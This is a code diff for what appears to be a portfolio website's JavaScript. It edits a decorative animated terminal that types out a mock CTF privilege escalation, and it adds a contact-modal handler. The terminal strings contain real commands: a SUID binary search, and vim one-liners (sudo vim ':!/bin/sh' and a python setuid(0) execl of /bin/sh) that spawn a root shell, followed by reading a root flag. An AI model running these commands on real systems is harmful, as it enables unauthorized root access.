@@ -134,17 +134,20 @@ document.addEventListener('DOMContentLoaded', () => {
         const commandDelay = 800;
         const typingSpeed = 50;
         const sequence = [
-            { type: 'input', text: 'whoami', prompt: 'user@box:~$ ' },
-            { type: 'output', text: 'www-data' },
-            { type: 'input', text: 'sudo -l', prompt: 'www-data@box:~$ ' },
-            { type: 'output', text: 'Matching Defaults entries for www-data on box:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\n\nUser www-data may run the following commands on box:\n    (ALL) NOPASSWD: /usr/bin/vim' },
-            { type: 'input', text: 'sudo /usr/bin/vim -c ":!/bin/sh"', prompt: 'www-data@box:~$ ' },
-            { type: 'output', text: 'Opening Vim editor...' },
-            { type: 'output', text: 'Spawning shell...' },
+            { type: 'input', text: 'whoami; id; hostname; uname -a', prompt: 'user@box:~$ ' },
+            { type: 'output', text: 'www-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbox-machine\nLinux box-machine 5.4.0-150-generic #167-Ubuntu SMP Mon May 20 17:33:00 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux' },
+
+            { type: 'input', text: 'find / -perm -u=s -type f 2>/dev/null', prompt: 'www-data@box:~$ ' },
+            { type: 'output', text: '/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/sudo\n/usr/bin/vim.basic\n/usr/bin/mount\n/usr/bin/umount' },
+
+            { type: 'input', text: 'vim -c \':py import os;os.setuid(0);os.execl("/bin/sh","sh")\'', prompt: 'www-data@box:~$ ' },
+            { type: 'output', text: '\n[!] Vim SUID detected. Launching python shell...\n' },
+
             { type: 'input', text: 'whoami', prompt: '# ' },
             { type: 'output', text: 'root' },
+
             { type: 'input', text: 'cat /root/root.txt', prompt: '# ' },
-            { type: 'output', text: 'HTB{Pr1v1l3g3_Esc4l4t10n_M4st3r_Succe55}\nCongratulations! You have pwned the machine.' }
+            { type: 'output', text: 'HTB{Pr1v1l3g3_Esc4l4t10n_Succ3ss_v1a_SUID}\n\nCongratulations! System Compromised.' }
         ];
 
         let seqIndex = 0;
@@ -200,6 +203,39 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         runTerminalSequence();
+    }
+
+    // --- CONTACT MODAL LOGIC ---
+    const modal = document.getElementById("contact-modal");
+    const btn = document.getElementById("contact-btn-float");
+    const closeBtn = document.getElementsByClassName("close-modal")[0];
+
+    if (btn && modal && closeBtn) {
+        // Open Modal
+        btn.onclick = function () {
+            modal.style.display = "flex";
+            // Trigger reflow
+            void modal.offsetWidth;
+            modal.classList.add("show");
+        }
+
+        // Close Modal
+        closeBtn.onclick = function () {
+            modal.classList.remove("show");
+            setTimeout(() => {
+                modal.style.display = "none";
+            }, 300); // Wait for transition
+        }
+
+        // Close if click outside
+        window.onclick = function (event) {
+            if (event.target == modal) {
+                modal.classList.remove("show");
+                setTimeout(() => {
+                    modal.style.display = "none";
+                }, 300);
+            }
+        }
     }
 
 });
